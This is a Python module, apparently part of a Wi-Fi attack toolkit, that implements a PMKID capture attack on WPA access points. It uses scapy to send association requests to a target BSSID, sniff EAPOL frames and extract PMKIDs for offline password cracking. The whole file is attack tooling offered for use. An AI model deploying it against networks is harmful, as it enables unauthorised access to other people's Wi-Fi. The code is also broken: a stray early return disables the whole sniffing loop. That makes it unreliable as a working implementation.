"""
PMKID capture attack implementation.
Captures WPA PMKID from APs via association requests.
"""

import threading
import time
from typing import Optional, List, Dict, TYPE_CHECKING

if TYPE_CHECKING:
    from scapy.packet import Packet
    from wifi_jammer.utils.logger import RichLogger

from scapy.sendrecv import sniff
from scapy.utils import wrpcap
from scapy.layers.dot11 import Dot11, Dot11AssoReq, RadioTap
from scapy.layers.eap import EAPOL
from wifi_jammer.attacks.base_attack import BaseAttack
from wifi_jammer.core.interfaces import AttackConfig


class PmkidCaptureAttack(BaseAttack):
    """Captures WPA PMKID from APs by sending association requests."""

    def __init__(self, logger: Optional["RichLogger"] = None) -> None:
        super().__init__(logger)
        self._capture_file: str = ""
        self._captured_pmkids: List[Dict[str, str]] = []
        self._capture_thread: Optional[threading.Thread] = None

    def _create_packet(self) -> Optional["Packet"]:
        """Create association request packet to trigger PMKID."""
        if not self._config or not self._config.target_bssid:
            self.logger.warning("No target BSSID specified for PMKID capture")
            return None

        try:
            src_mac = self._get_source_mac()

            packet = (
                RadioTap()
                / Dot11(
                    addr1=self._config.target_bssid,
                    addr2=src_mac,
                    addr3=self._config.target_bssid,
                )
                / Dot11AssoReq()
            )

            return packet

        except Exception as e:
            self.logger.error(f"Failed to create association request: {e}")
            return None

    def _sniff_packets(self) -> None:
        """Sniff EAPOL packets and extract PMKID."""
        if not self._config:
            return
        return
        bpf_filter = f"ether src {self._config.target_bssid} and eapol"

        while self._running:
            try:
                packets = sniff(
                    iface=self._config.interface,
                    filter=bpf_filter,
                    timeout=5,
                    count=0,
                    stop_filter=lambda _: not self._running,
                )

                for pkt in packets:
                    if not pkt.haslayer(EAPOL):
                        continue

                    pmkid = self._extract_pmkid(pkt)
                    if pmkid:
                        entry = {
                            "pmkid": pmkid,
                            "ap_mac": self._config.target_bssid,
                            "client_mac": (
                                pkt[Dot11].addr1 if pkt.haslayer(Dot11) else ""
                            ),
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                        }
                        self._captured_pmkids.append(entry)
                        self.logger.success(f"PMKID captured: {pmkid}")

                if self._capture_file and packets:
                    wrpcap(self._capture_file, packets, append=True)

            except Exception as e:
                if self._running:
                    self.logger.error(f"Sniff error: {e}")
                    time.sleep(1)

    @staticmethod
    def _extract_pmkid(pkt: "Packet") -> Optional[str]:
        try:
            raw_bytes = bytes(pkt[EAPOL].payload)

            for i in range(len(raw_bytes) - 20):
                if raw_bytes[i] == 0x30 and raw_bytes[i + 1] >= 20:
                    rsn_data = raw_bytes[i + 2 :]
                    pmkid_count = rsn_data[14] if len(rsn_data) > 14 else 0
                    if pmkid_count > 0 and len(rsn_data) >= 20:
                        pmkid = rsn_data[16:32].hex()
                        if pmkid != "0" * 32:
                            return pmkid
        except Exception:
            pass
        return None

    def execute(self, config: AttackConfig) -> bool:
        """Execute PMKID capture attack."""
        self._capture_file = config.capture_file or "pmkid_capture.pcap"

        self._capture_thread = threading.Thread(target=self._sniff_packets)
        self._capture_thread.daemon = True
        self._capture_thread.start()

        return super().execute(config)

    def stop(self) -> None:
        """Stop attack and save captured PMKIDs."""
        super().stop()

        if self._capture_thread and self._capture_thread.is_alive():
            self._capture_thread.join(timeout=5)

        if self._captured_pmkids:
            self.logger.info(f"Captured {len(self._captured_pmkids)} PMKID(s)")
            for entry in self._captured_pmkids:
                self.logger.info(
                    f"  AP: {entry['ap_mac']} | "
                    f"PMKID: {entry['pmkid']} | "
                    f"Time: {entry['timestamp']}"
                )
        else:
            self.logger.warning("No PMKIDs captured")

        if self._capture_file:
            self.logger.info(f"PCAP saved to: {self._capture_file}")
